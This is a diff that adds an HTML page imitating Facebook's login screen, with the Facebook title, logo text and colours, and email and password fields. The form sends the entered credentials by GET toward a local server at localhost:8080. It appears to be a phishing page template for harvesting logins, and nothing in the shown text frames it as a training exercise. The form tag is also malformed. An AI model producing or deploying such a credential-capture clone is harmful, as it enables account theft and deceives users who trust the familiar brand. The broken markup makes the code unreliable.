@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .logo {
+      font-size: 48px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .login-box {
+      background-color: #fff;
+      padding: 20px 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      width: 360px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      padding: 14px;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-box button:hover {
+      background-color: #166fe5;
+    }
+
+    .forgot {
+      text-align: center;
+      margin-top: 12px;
+    }
+
+    .forgot a {
+      text-decoration: none;
+      color: #1877f2;
+      font-size: 14px;
+    }
+
+    .separator {
+      margin: 20px 0;
+      border-top: 1px solid #dadde1;
+    }
+
+    .create-account {
+      text-align: center;
+    }
+
+    .create-account button {
+      background-color: #42b72a;
+      margin-top: 10px;
+    }
+
+    .create-account button:hover {
+      background-color: #36a420;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">facebook</div>
+    <div class="login-box">
+      <form action contenteditable=http://localhost:8080"" method="GET">
+        <input type="text" placeholder="Email or phone number" name="email" />
+        <input type="password" placeholder="Password" name="password" />
+        <button type="submit">Log In</button>
+      </form>
+      <div class="forgot">
+        <a href="#">Forgotten password?</a>
+      </div>
+      <div class="separator"></div>
+      <div class="create-account">
+        <button>Create New Account</button>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
